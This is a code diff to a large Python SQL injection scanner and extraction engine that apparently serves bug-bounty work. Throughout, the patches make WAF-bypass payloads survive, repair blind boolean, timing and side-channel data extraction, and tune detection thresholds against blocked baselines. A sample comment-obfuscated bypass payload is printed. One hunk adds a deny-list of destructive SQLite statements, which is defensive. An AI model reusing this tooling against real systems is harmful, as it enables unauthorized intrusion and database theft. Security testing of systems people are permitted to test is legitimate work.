@@ -36731,6 +36731,7 @@ def get_dbms_payloads(dbms: str, technique: str, level: int = 1) -> list:
             _filter_is_oracle = (_filter_dbms_key == 'Oracle')
             _filter_is_mssql = (_filter_dbms_key == 'MSSQL')
             _filter_is_pg = (_filter_dbms_key == 'PostgreSQL')
+            _filter_is_sqlite = (_filter_dbms_key == 'SQLite')
             # BUG-REMAINING-1 FIX (Req 1/3 — Oracle DDL/DML/PL-SQL globals() bypass):
             # _populate_certified_db() filters Oracle DDL/DML/PL-SQL via _ORA_DDL_PREFIXES
             # but only modifies CERTIFIED_PAYLOAD_DATABASE — it does NOT modify the raw
@@ -36830,6 +36831,30 @@ def get_dbms_payloads(dbms: str, technique: str, level: int = 1) -> list:
                 _pu = p.upper().lstrip()
                 return any(_pu.startswith(_pfx) or _pfx in _pu
                            for _pfx in _MSSQL_DANGEROUS_PREFIXES)
+            # BUG-SQLITE-DDL-GLOBALS-FIX (SQLITE-BUG-1 CRITICAL): SQLITE_STACKED_PAYLOADS
+            # contains permanently destructive DDL/DML operations (ALTER TABLE ... ADD COLUMN,
+            # DROP TABLE, ATTACH DATABASE, INSERT OR REPLACE, REPLACE INTO, CREATE TRIGGER,
+            # UPDATE sqlite_master) that permanently alter target database schema and data.
+            # MSSQL has _is_mssql_dangerous() and Oracle has _is_oracle_ddl() for this same
+            # problem, but SQLite has no equivalent — all destructive SQLite stacked payloads
+            # pass through the globals() path unfiltered.  This is a critical responsible
+            # disclosure violation for bug-bounty targets.
+            # Fix: add SQLite DDL/DML filter equivalent to MSSQL and Oracle protections.
+            _SQLITE_DANGEROUS_PATTERNS = (
+                'ALTER TABLE ',      # schema modification (ADD COLUMN, etc.)
+                'DROP TABLE',        # destructive table removal
+                'ATTACH DATABASE',   # attaches in-memory/file databases (data exfil pivot)
+                'INSERT OR REPLACE', # replaces rows (corrupts data)
+                'REPLACE INTO',      # replaces rows (corrupts data)
+                'CREATE TRIGGER',    # persistent backdoor hook
+                'UPDATE SQLITE_MASTER',  # directly corrupts schema table
+                'BEGIN;UPDATE',      # transaction wrapping destructive UPDATE
+                'BEGIN;DELETE',      # transaction wrapping destructive DELETE
+                'DETACH DATABASE',   # can cause data corruption in multi-attach scenarios
+            )
+            def _is_sqlite_dangerous(p: str) -> bool:
+                _pu = p.upper()
+                return any(pat in _pu for pat in _SQLITE_DANGEROUS_PATTERNS)
             # BUG-REMAINING-3 FIX (Req 1/3 — PostgreSQL COPY TO globals() bypass):
             # _is_bomb_cpdb() catches "COPY (SELECT", "COPY pg_", " TO '/tmp/" etc.
             # via _ddl_kws. However _is_bomb_cpdb() is only called during CPDB population
@@ -36917,15 +36942,31 @@ def get_dbms_payloads(dbms: str, technique: str, level: int = 1) -> list:
                     # path, but globals() returns POSTGRESQL_NOVEL_PAYLOADS unmodified. COPY TO
                     # writes server-side files — out of scope for SQL injection detection.
                     and not (_filter_is_pg and _is_pg_copy_to(_gp))
+                    # BUG-SQLITE-DDL-GLOBALS-FIX (SQLITE-BUG-1 CRITICAL): Filter destructive
+                    # SQLite DDL/DML operations (ALTER TABLE, DROP TABLE, ATTACH DATABASE,
+                    # INSERT OR REPLACE, REPLACE INTO, CREATE TRIGGER, UPDATE sqlite_master)
+                    # from globals() path.  SQLITE_STACKED_PAYLOADS contains payloads that
+                    # permanently alter target database schema and data — a critical responsible
+                    # disclosure violation.  Mirrors _is_mssql_dangerous() and _is_oracle_ddl().
+                    and not (_filter_is_sqlite and _is_sqlite_dangerous(_gp))
                     # BUG-PG-SLEEP-VOID FIX: pg_sleep() returns void; placing it directly in a
                     # WHERE clause (e.g. WHERE pg_sleep(5)=...) causes a type error rather than
                     # a timing delay.  Only allow pg_sleep payloads that wrap it in a boolean-
-                    # compatible form (IS NOT NULL, cast, SELECT 1 FROM pg_sleep, etc.).
+                    # compatible form (IS NOT NULL, cast, SELECT 1 FROM pg_sleep, ::void, etc.).
+                    # BUG-PG-SLEEP-VOID-CAST-FIX (POSTGRESQL-BUG-2): The ::void cast pattern
+                    # (e.g. "AND CASE WHEN 2>1 THEN pg_sleep(0.3)::void ELSE NULL END") is the
+                    # standard PostgreSQL idiom to suppress the type-mismatch error when using
+                    # pg_sleep() in a boolean context.  The previous whitelist did NOT include
+                    # "::void", so every ::void-cast pg_sleep payload was incorrectly removed.
+                    # This left PostgreSQL timing detection with only heavy cross-join payloads
+                    # (no pg_sleep at all), dramatically reducing timing detection reliability.
+                    # Fix: add ::void to the whitelist regex.
                     and not (_filter_is_pg
                              and _re.search(r'\bpg_sleep\b', _gp, _re.IGNORECASE)
                              and not _re.search(
                                  r'IS\s+NOT\s+NULL|=\s*1\b|SELECT\s+1\s+FROM\s+pg_sleep|'
-                                 r'cast\s*\(\s*pg_sleep|SELECT\s+CAST\s*\(\s*pg_sleep',
+                                 r'cast\s*\(\s*pg_sleep|SELECT\s+CAST\s*\(\s*pg_sleep|'
+                                 r'::\s*void',   # ::void is the standard pg_sleep boolean-context cast
                                  _gp, _re.IGNORECASE))
                 )
             ]
@@ -53792,11 +53833,23 @@ class Scanner:
         # This eliminates all per-call import overhead for the full extraction lifecycle.
 
         _det = enum.result
-        _payload_raw = unquote(unquote(getattr(_det, "payload", "") or ""))
-        # Untamper
-        _payload_raw = _re.sub(r'/\*[^*]*\*/', ' ', _payload_raw)  # BUG-FIX-1C: __re was undefined
-        _payload_raw = _re.sub(r'[\x00-\x1f]+', ' ', _payload_raw)  # BUG-FIX-1C: __re was undefined
-        _payload_raw = _re.sub(r'  +', ' ', _payload_raw).strip()
+        # BUG-INFERENCE-BYPASS-STRIP-FIX (CRITICAL): Previously always read _det.payload
+        # and stripped ALL /*comment*/ bypass markers via regex, turning the WB bypass
+        # payload "' and/*a*/1/*a*/%3d1" into the plain "' and 1 =1".  Every oracle probe
+        # then used the stripped template without bypass → WAF blocks all probes → oracle
+        # sanity fails (both 1=1 and 1=2 return same WAF error page → both evaluate True).
+        # Fix: prefer exact_sent_payload (the actual bytes sent during detection, with bypass
+        # markers intact) when it is available.  Only fall back to stripping when the exact
+        # payload was not stored.
+        _exact_payload = getattr(_det, 'exact_sent_payload', None) or ''
+        if _exact_payload:
+            _payload_raw = _exact_payload  # bypass markers preserved — do NOT strip comments
+        else:
+            _payload_raw = unquote(unquote(getattr(_det, "payload", "") or ""))
+            # Untamper (only when exact payload not available)
+            _payload_raw = _re.sub(r'/\*[^*]*\*/', ' ', _payload_raw)
+            _payload_raw = _re.sub(r'[\x00-\x1f]+', ' ', _payload_raw)
+            _payload_raw = _re.sub(r'  +', ' ', _payload_raw).strip()
         
         # ROOT-CAUSE-FIX #1: Extract comment marker FIRST before building _body.
         # enum.original = "' AND 1=1-- -" ends with a comment marker. Any subsequent
@@ -55161,9 +55214,18 @@ class Scanner:
             _expected_sleep_ms = _delay * 1000
             _timing_dead = _best_ms_t < _expected_sleep_ms * 0.3
             _skip_templates = False
-            if _timing_dead and not _boolean_oracle:
-                LOG.info("[Inference] Timing oracle dead (TRUE=%.0fms, expected=%.0fms)  skipping templates",
-                         _best_ms_t, _expected_sleep_ms)
+            if _timing_dead or _boolean_oracle:
+                # BUG-ARITH-TEMPLATE-BOOLEAN-SKIP FIX (MEDIUM): _skip_templates was only set when
+                # timing dead AND NOT boolean oracle. When a boolean oracle IS active but timing is
+                # dead, the arithmetic template search still ran — wastefully searching the stripped
+                # payload for a pg_sleep/SLEEP function that was never there (stripped by comment-regex),
+                # always finding nothing, and logging "trying arithmetic template" spuriously.
+                # Fix: also skip when boolean oracle is active — the oracle doesn't need timing templates.
+                if _boolean_oracle and not _timing_dead:
+                    LOG.info("[Inference] Boolean oracle active — skipping timing templates (not needed)")
+                else:
+                    LOG.info("[Inference] Timing oracle dead (TRUE=%.0fms, expected=%.0fms)  skipping templates",
+                             _best_ms_t, _expected_sleep_ms)
                 _skip_templates = True
             
             #  FIX #4: STATISTICAL MICRO-TIMING 
@@ -58970,11 +59032,23 @@ class Scanner:
             # → chr(0x1FFFFF) → garbage codepoints (󗫵, 󜽆, etc.).
             # A live 1=1 / 1=2 sanity pair catches this before we waste hundreds of
             # probes producing garbage output.
+            #
+            # BUG-SANITY-USES-EVAL-NOT-WAF-AWARE FIX (HIGH): The sanity check was using
+            # _eval("1=1") which calls _send_payload directly — no pre-wired bypass oracle
+            # fallback. For WB/ST bypass techniques, the template has bypass markers stripped
+            # (Bug 2) → both probes go through as plain SQL → WAF blocks both → both return
+            # same 400-page body → both evaluate to same value → sanity fails spuriously.
+            # Fix: use _waf_aware_eval which falls back to the pre-wired detection oracle
+            # (e.g. _inline_bool_oracle_wb) at line 58031 — that oracle uses the actual
+            # bypass-aware detection template and correctly distinguishes 1=1 from 1=2.
+            # Additionally: if both sanity probes return None (WAF blocks both), do NOT mark
+            # oracle fragile — None means the oracle is ambiguous for these conditions but
+            # may work fine for the actual extraction probes that use heavier PME mutation.
             if not _oracle_fragile:
                 try:
-                    _san_t = await _eval("1=1")
+                    _san_t = await _waf_aware_eval("1=1")
                     await asyncio.sleep(_delay * 0.5)
-                    _san_f = await _eval("1=2")
+                    _san_f = await _waf_aware_eval("1=2")
                     # BUG-ORACLE-SANITY-IS-CHECK FIX: `is True`/`is False` only matches Python
                     # singleton booleans. Comparison operators (ms >= _thresh, _sim_gap > 0)
                     # always produce singletons in CPython, but use explicit not/bool guards
@@ -58999,6 +59073,18 @@ class Scanner:
                             "(1=1→False, 1=2→True) — activating oracle inversion; "
                             "all subsequent True/False oracle results will be flipped"
                         )
+                    elif _san_t is None and _san_f is None:
+                        # Both probes returned None (WAF blocked both). This does NOT mean
+                        # the oracle is broken — it means the simple 1=1/1=2 conditions hit
+                        # the WAF before the pre-wired oracle could evaluate them.
+                        # The extraction probes use PME with heavy mutation and should bypass;
+                        # do NOT abort extraction on WAF-blocked sanity-only probes.
+                        LOG.info(
+                            "[Inference] Deferred oracle sanity: both probes returned None "
+                            "(WAF blocked raw conditions) — trusting oracle since detection used bypass; "
+                            "extraction probes use PME mutation and should get through"
+                        )
+                        # sanity passes — _oracle_fragile stays False
                     else:
                         _oracle_fragile = True
                         LOG.info(
@@ -82216,10 +82302,20 @@ def _build_det_template(result) -> str:
     or "" if the payload cannot be parsed.
     """
     # BUG-PERCALL-IMPORT-FIX: unquote already at module level (L9398)
-    _p = unquote(unquote(getattr(result, 'payload', '') or ''))
-    _p = _re.sub(r'/\*[^*]*\*/', ' ', _p)
-    _p = _re.sub(r'[\x00-\x1f]+', ' ', _p)
-    _p = _re.sub(r'  +', ' ', _p).strip()
+    # BUG-BUILDDET-BYPASS-STRIP-FIX (CRITICAL): Same bypass-stripping bug as _inference_extract.
+    # _build_det_template was stripping all /*comment*/ bypass markers from the detection
+    # payload via regex, destroying the WB/ST/NV bypass structure that the WAF allowed.
+    # The resulting stripped template (e.g. "' and 1 =1") is blocked by the WAF on every
+    # oracle probe, making _inline_bool_oracle_wb completely non-functional on WAF targets.
+    # Fix: prefer exact_sent_payload when available so the full bypass structure is preserved.
+    _exact_det = getattr(result, 'exact_sent_payload', None) or ''
+    if _exact_det:
+        _p = _exact_det  # bypass markers preserved — do NOT strip comments
+    else:
+        _p = unquote(unquote(getattr(result, 'payload', '') or ''))
+        _p = _re.sub(r'/\*[^*]*\*/', ' ', _p)
+        _p = _re.sub(r'[\x00-\x1f]+', ' ', _p)
+        _p = _re.sub(r'  +', ' ', _p).strip()
     if not _p:
         return ''
     _cm = _re.search(r'\s*(?:--\s*-?|-#|#)\s*$', _p)
@@ -89543,6 +89639,10 @@ class ScannerV10(ScannerV9):
         # Use stability-adjusted thresholds
         bool_thresh   = (0.40 if getattr(self.config, "no_stability", False) else
                          stability.bool_threshold if stability else 0.22)
+        # BUG-BBOOL-WAF-THRESH-FIX (BUG 4 HIGH): same WAF-blocked-baseline raise as cascade.
+        _bl_ms_v10 = (baseline.get("modal_status", 200) if isinstance(baseline, dict) else 200)
+        if _bl_ms_v10 in (400, 403, 406, 429) and not getattr(self.config, "no_stability", False):
+            bool_thresh = max(bool_thresh, 0.35)
         time_thresh_ms= stability.timing_threshold if stability else 2000.0
 
         # Loop through techniques until one passes PCV
@@ -106174,7 +106274,29 @@ class TechniqueCascadeEngine:
                 _pcv_nonce = random.randint(1_000_000, 9_999_999)
                 _pcv_cbh = hashlib.md5(str(p).encode('utf-8', errors='replace')).hexdigest()[:10]
                 _pcv_cb_suffix = _get_cache_bust_params(_pcv_nonce, _pcv_cbh)
-                _pcv_url = url + ("&" if "?" in url else "?") + _pcv_cb_suffix
+                # BUG-PCV-BASELINE-URL-POST-FIX (CRITICAL): For POST/PUT/PATCH endpoints,
+                # unconditionally appending ?cb_nonce=N&cb_hash=H to the URL produces a
+                # URL that many servers and WAFs reject with 400 "unexpected query parameters".
+                # The BASELINE probe (p=="") then returns a 400 error page → _bl_fp.body
+                # is the WAF error page body → all Check A similarity gaps collapse to ~0
+                # (canary 200-page vs 400-baseline = both equally dissimilar) → every injection
+                # gets "no-gap-above-threshold" even when the SQL IS actually being executed.
+                # Fix: for POST/PUT/PATCH with no existing query string, add cache-bust as a
+                # header instead of a URL parameter. GET/HEAD requests keep URL cache-busting
+                # since Cloudflare and other CDNs key GET caches on the full URL.
+                # Also: for the baseline probe (p==""), never add URL params on POST — the
+                # clean baseline must hit the same URL as the original detection request.
+                _pcv_is_post = method.upper() in ("POST", "PUT", "PATCH", "DELETE")
+                _pcv_has_qs = "?" in url
+                if _pcv_is_post and not _pcv_has_qs and p == "":
+                    # Baseline probe on POST: use original URL, no cache-bust URL params
+                    # (server may return 400 for POST with unexpected query params)
+                    _pcv_url = url
+                elif _pcv_is_post and not _pcv_has_qs:
+                    # Non-baseline POST probe: add cache-bust as header, not URL param
+                    _pcv_url = url
+                else:
+                    _pcv_url = url + ("&" if _pcv_has_qs else "?") + _pcv_cb_suffix
                 _pcv_data, _pcv_extra = data, {}
                 # Apply padding if active
                 _pcv_pad = getattr(self, '_padding_engine', None)
@@ -106209,9 +106331,21 @@ class TechniqueCascadeEngine:
                         _pcv_value = _pcv_kw.apply_bypass(_pcv_value)
                     _bypass = True  # FIX-R12-1: bypass 20-layer mutation for canary SQL
                 
+                # BUG-PCV-DOUBLE-TAMPER-FIX (CRITICAL): When using exact_sent_payload,
+                # the payload has ALREADY had the tamper chain applied once by
+                # compute_exact_payload (via TamperLib.apply_chain). Passing self.tamper_chain
+                # to _send_injected causes _send_injected_inner to apply it AGAIN at line
+                # ~35582 (TamperLib.apply_chain(value, tamper_chain)) regardless of
+                # _bypass_mutation=True (which only gates PME structural mutation, not the
+                # final tamper step). Double-tamping produces invalid SQL (e.g. "AND/**/ /**/"
+                # for space2comment, or "%2525" double-percent-encoding for charencode) →
+                # server returns 400 → detection replay fails → Check E sim≈1.0 → FAIL.
+                # Fix: pass [] (empty tamper chain) when using exact_sent_payload so the
+                # already-tampered bytes pass through _send_injected without modification.
+                _pcv_tc = [] if (_use_exact_payload and p == payload) else self.tamper_chain
                 fp = await asyncio.wait_for(
                     _send_injected(self.engine, method, _pcv_url, _pcv_data, data_fmt,
-                        param, _pcv_value, self.tamper_chain,
+                        param, _pcv_value, _pcv_tc,
                         extra_headers=_pcv_extra if _pcv_extra else None,
                         _header_inject_name=_pcv_hdr_name,  # FIX: route to correct surface
                         _bypass_mutation=_bypass),
@@ -106658,6 +106792,24 @@ class TechniqueCascadeEngine:
                     _check_a_waf_counts[1] += 1  # total_pairs — only count truly-sent pairs
                     _t_waf = (_fp_t is not None and WAFBlockDiscriminator.is_waf_block(_fp_t))
                     _f_waf = (_fp_f is not None and WAFBlockDiscriminator.is_waf_block(_fp_f))
+                    # BUG-CHECKA-PLAIN400-WAF-FIX (HIGH): WAFBlockDiscriminator.is_waf_block()
+                    # only recognizes WAFs with known fingerprint signatures (body patterns,
+                    # custom headers).  A WAF that returns plain 400/403/429 without a recognized
+                    # signature — the case observed in the log (155B plain 400, no WAF markers) —
+                    # leaves _t_waf=False and _f_waf=False.  Both canary probes get blocked (gap≈0),
+                    # but _check_a_waf_counts[0] stays at 0 → _check_a_all_waf_blocked=False.
+                    # The code then wrongly infers Check A's gap failure is a genuine detection FP
+                    # signal rather than WAF interference, blocking Check E standalone confirmation.
+                    # Fix: also count as "WAF blocked" when BOTH canary probes return a 4xx status
+                    # that is characteristic of WAF blocking (400=Bad Request, 403=Forbidden,
+                    # 406=Not Acceptable, 429=Too Many Requests).  Counting only when BOTH are 4xx
+                    # avoids false WAF classification when one probe legitimately differs.
+                    if not (_t_waf and _f_waf):
+                        _t_st = getattr(_fp_t, 'status_code', None)
+                        _f_st = getattr(_fp_f, 'status_code', None)
+                        if (_t_st in (400, 403, 406, 429) and _f_st in (400, 403, 406, 429)):
+                            _t_waf = True
+                            _f_waf = True
                     if _t_waf and _f_waf:
                         _check_a_waf_counts[0] += 1  # blocked_count
                 except Exception:
@@ -110474,6 +110626,28 @@ class TechniqueCascadeEngine:
 
         bool_thresh = (0.40 if getattr(self.config, "no_stability", False) else
                stability.bool_threshold if stability else 0.20)
+        # BUG-BBOOL-WAF-THRESH-FIX (BUG 4 HIGH): When the baseline consists of WAF-blocked
+        # responses (modal status 400/403/406/429), the stability profiler sees very low
+        # response variance (every blocked response looks the same), so it assigns a low
+        # bool_thresh (≈ 0.20), yielding detection threshold = 1.0 - 0.20 = 0.800.
+        # In WAF-bypass scenarios, the bypass payload returns the REAL backend page (large
+        # body, different content), while the false-condition probe gets the WAF block page
+        # (tiny body, same as baseline).  The combined score ≈ 0.77 is consistently just
+        # below 0.800.  B-bool never fires, leaving Wasserstein as the only detection path.
+        # Fix: when the baseline modal status is a WAF-characteristic 4xx code, raise
+        # bool_thresh to at least 0.35 (threshold ≤ 0.650) so bypass probes with combined
+        # ≈ 0.77 correctly trigger detection.  This does NOT apply to normal 200 baselines
+        # where the threshold 0.800 correctly rejects borderline signals.
+        _bl_modal_status = (baseline.get("modal_status", 200)
+                            if isinstance(baseline, dict) else 200)
+        if _bl_modal_status in (400, 403, 406, 429) and not getattr(self.config, "no_stability", False):
+            _waf_thresh = max(bool_thresh, 0.35)
+            if _waf_thresh > bool_thresh:
+                LOG.info("[Cascade] WAF-blocked baseline detected (modal_status=%d) — "
+                         "raising bool_thresh %.2f → %.2f (detection threshold %.2f → %.2f) "
+                         "for WAF-bypass detection", _bl_modal_status,
+                         bool_thresh, _waf_thresh, 1.0 - bool_thresh, 1.0 - _waf_thresh)
+                bool_thresh = _waf_thresh
         norm_base = ResponseNormaliser.normalise(
             (getattr(baseline.get("samples", [None])[0], "body", b"") if baseline.get("samples") else b""))
 
@@ -110624,7 +110798,19 @@ class TechniqueCascadeEngine:
                             if _pg > _max_clean_gap:
                                 _max_clean_gap = _pg
             self._dynamic_gap = min(0.700, max(0.300, _max_clean_gap + 0.15))
-            self._dynamic_wass = self._dynamic_gap
+            # BUG-WASS-DYNSCALE-FIX (BUG 2 HIGH): was `self._dynamic_wass = self._dynamic_gap`.
+            # _dynamic_gap is a SimHash similarity *gap* (domain 0.0-1.0, where 0.0 = identical
+            # SimHash, 1.0 = completely different).  Wasserstein distance operates on a completely
+            # different scale: 0.00-0.05 for clean traffic, 0.30-0.80 for injection signals.
+            # On dynamic CDN pages, SimHash pairwise gaps reach 0.55+ → _dynamic_gap = 0.700.
+            # Setting _dynamic_wass = 0.700 means Wasserstein only fires when dist > 0.700.
+            # Real SQL injection via WAF bypass produces dist ≈ 0.50-0.70.  The observed signal
+            # at dist = 0.666 (a very strong injection signal) is rejected because 0.666 > 0.700
+            # is False → zero Wasserstein confirmations on all bypass attempts.
+            # Fix: cap _dynamic_wass at 0.350 (well below real injection signals at dist ≈ 0.50+
+            # while well above page-level noise at dist ≈ 0.02-0.05).  This keeps the Wasserstein
+            # threshold in its own scale regardless of the SimHash calibration result.
+            self._dynamic_wass = min(0.350, self._dynamic_gap)
             # (Wasserstein per-param failure counter removed — boolean payloads run
             #  to completion regardless of PCV failure history.)
             print(f"[+] [DynGap] max_clean={_max_clean_gap:.3f} "
@@ -113406,8 +113592,37 @@ class TechniqueCascadeEngine:
                                 # injection. If injection was confirmed, high-dist consistent
                                 # signals are more injection, not page noise.
                                 if _wass_noise_range and _wass_dist > 0.50 and not _wass_param_confirmed:
-                                    # Store/update noise floor as window mean (high-dist noise)
-                                    _wdh[_wass_noise_floor_key] = sum(_wdh_p) / len(_wdh_p)
+                                    # BUG-WASS-FLOOR-NEAR-THRESHOLD-FIX (BUG 3 HIGH):
+                                    # The noise floor guard in BUG-WASS-CONSISTENT-BLOCKS-INJECTION
+                                    # FIX relies on _wass_param_confirmed=True to block noise-floor
+                                    # establishment after confirmed injection.  But _wass_confirmed_key
+                                    # is only set at line `_wdh[_wass_confirmed_key] = True` which is
+                                    # only reachable when `_wass_dist > _wass_min`.  Bug 2 causes
+                                    # _wass_min=0.700 > 0.666=injection_dist → that branch is NEVER
+                                    # reached → _wass_param_confirmed always False → noise floor is
+                                    # established at dist=0.666 after 3rd bypass probe → all future
+                                    # injection signals at dist≈0.666 get suppressed as "page noise".
+                                    #
+                                    # Fix: Add a guard preventing noise floor establishment when dist
+                                    # is within 10% below the detection threshold (clearly a plausible
+                                    # injection signal, not definitively noise).  Only establish the
+                                    # floor when dist is clearly below threshold (< 90% of _wass_min)
+                                    # — i.e., unambiguously below the detection boundary.
+                                    # Safety: when _wass_min is correctly calibrated (per Bug 2 fix
+                                    # above, _wass_min ≤ 0.350), clean traffic at dist ≈ 0.019 is
+                                    # far below 0.315 (90% of 0.350), so genuine page noise still
+                                    # correctly establishes a noise floor.  Injection signals at
+                                    # dist ≈ 0.666 are above 0.315 → floor NOT established.
+                                    if _wass_dist < _wass_min * 0.90:
+                                        # Clearly below threshold — genuine page noise, store floor
+                                        # Store/update noise floor as window mean (high-dist noise)
+                                        _wdh[_wass_noise_floor_key] = sum(_wdh_p) / len(_wdh_p)
+                                    else:
+                                        LOG.debug(
+                                            "[Wasserstein] dist=%.4f is within 10%% of threshold %.3f "
+                                            "(dist ≥ _wass_min*0.90=%.3f) — NOT establishing noise "
+                                            "floor (may be injection signal with miscalibrated threshold)",
+                                            _wass_dist, _wass_min, _wass_min * 0.90)
                                     try: self._wass_dist_hist = _wdh
                                     except Exception: pass
                                 try: self._wass_dist_hist = _wdh
@@ -116764,7 +116979,15 @@ class TechniqueCascadeEngine:
                             param=param, technique="B",
                             payload=true_sfx,
                             dbms=self.known_dbms or "MySQL",
-                            confidence=min(0.88, 0.65 + delta),
+                            # BUG-CTX-REVPOL-CONFIDENCE-FIX (BUG 1 HIGH): was `0.65 + delta`.
+                            # For reversed-polarity (WAF bypass), sim_t ≈ 0.50 (real page) and
+                            # sim_f ≈ 1.00 (WAF block = same as blocked baseline), so
+                            # delta = sim_t - sim_f ≈ -0.50.  This yielded confidence ≈ 0.15
+                            # which is below every PCV gate (all require ≥ 0.60), causing the
+                            # detection object to be immediately discarded even when the signal
+                            # is real and unambiguous.  Fix: use abs(delta) so reversed-polarity
+                            # detections get the same confidence boost as normal-polarity ones.
+                            confidence=min(0.88, 0.65 + abs(delta)),
                             notes=f"{ctx_name}_context_boolean delta={delta:.3f} bypass=none")
                         try:
                             _det_by.exact_sent_payload = DetectionResult.compute_exact_payload(
@@ -119149,9 +119372,13 @@ class UniversalScanOrchestrator:
                     # Consequence: _i_am_extraction_owner stayed False for the winner →
                     # _extraction_first() returned immediately → extraction NEVER ran.
                     # Fix: also check _EXTRACTION_STARTED[1] (the owner ID set in inner else).
-                    # If it equals OUR {param}@{dbms}, WE own extraction → go to winner path.
+                    # If it equals OUR {param}@{dbms}@{method}, WE own extraction → go to winner path.
                     # Only fire the loser path when a DIFFERENT surface owns the flag.
-                    _our_ext_owner_id = f"{param}@{_confirmed_dbms}"
+                    # BUG-EXT-OWNER-METHOD-FIX (CRITICAL): _EXTRACTION_STARTED[1] is set to
+                    # f"{param}@{_confirmed_dbms}@{method}" at line 119112 (includes HTTP method),
+                    # but _our_ext_owner_id was built WITHOUT @{method} → string never matches →
+                    # winner misclassified as loser → extraction NEVER runs on any surface.
+                    _our_ext_owner_id = f"{param}@{_confirmed_dbms}@{method}"
                     if _EXTRACTION_DONE[0] or (
                             _EXTRACTION_STARTED[0] and
                             _EXTRACTION_STARTED[1] != _our_ext_owner_id):
@@ -126372,11 +126599,18 @@ class ScannerV14(ScannerV13):
                                getattr(self, 'results', []) or [])
                     if _stored:
                         _f = _stored[-1]  # most recent
+                        # BUG-PY313-RECOVERY-EXACT-PAYLOAD-FIX (HIGH): The manually-built
+                        # _best_conf dict lacked a 'result' key, so _process_v11 received no
+                        # DetectionResult object → exact_sent_payload was None in the recovery
+                        # path → _inference_extract fell back to stripping the bypass markers
+                        # from the plain payload field → WAF blocked all inference probes.
+                        # Fix: include 'result': _f so _process_v11 can access exact_sent_payload.
                         _best_conf = {
                             'param': getattr(_f, 'param', '') or str(_EXTRACTION_STARTED[1]).split('@')[0],
                             'dbms':  getattr(_f, 'dbms', 'PostgreSQL'),
                             'technique': getattr(_f, 'technique', 'T'),
                             'data': data,
+                            'result': _f,  # pass full DetectionResult so exact_sent_payload is available
                         }
                 except Exception:
                     pass
@@ -133483,11 +133717,19 @@ class SideChannelExtractor:
         # BUG-SCE-WE-SANITY FIX: Verify oracle polarity before starting binary search.
         # Without this check, a stale or inverted oracle (e.g. probe_where_error() reused
         # a strategy that returns True for everything) causes the binary search to converge
-        # on chr(1114111) garbage for every position.  Test 1=1 (must be True) vs 1=2
-        # (must be False); if either fails, abort extraction for this expression.
+        # on chr(1114111) garbage for every position.  Test a true condition vs a false one;
+        # if either fails, abort extraction for this expression.
+        # BUG-SCE-SANITY-EXPR-FIX (HIGH): Changed "1=1"/"1=2" to "1>0"/"1>2".
+        # The WHERE-ERROR oracle strategies calibrate and execute using > comparisons (1>0,
+        # 1>2) internally.  Using "1=1"/"1=2" for sanity introduces a subtle mismatch:
+        # if the oracle happens to use a range-check strategy (BETWEEN or >) rather than
+        # equality, "1=1" may evaluate differently at the SQL layer than "1>0" (e.g. on MSSQL
+        # with certain collations, = can coerce types differently from >).  Using the same
+        # comparison form (>) ensures the sanity check tests the identical code path and
+        # condition-evaluation semantics that the binary search uses.
         try:
-            _san_true  = await self.eval_where_error("1=1")
-            _san_false = await self.eval_where_error("1=2")
+            _san_true  = await self.eval_where_error("1>0")   # always true  (was "1=1")
+            _san_false = await self.eval_where_error("1>2")   # always false (was "1=2")
             if _san_true is not True or _san_false is not False:
                 print(f"[SideChannel] Oracle sanity FAILED (1=1→{_san_true}, 1=2→{_san_false})"
                       f" — aborting extraction for: {expr[:50]}", flush=True)
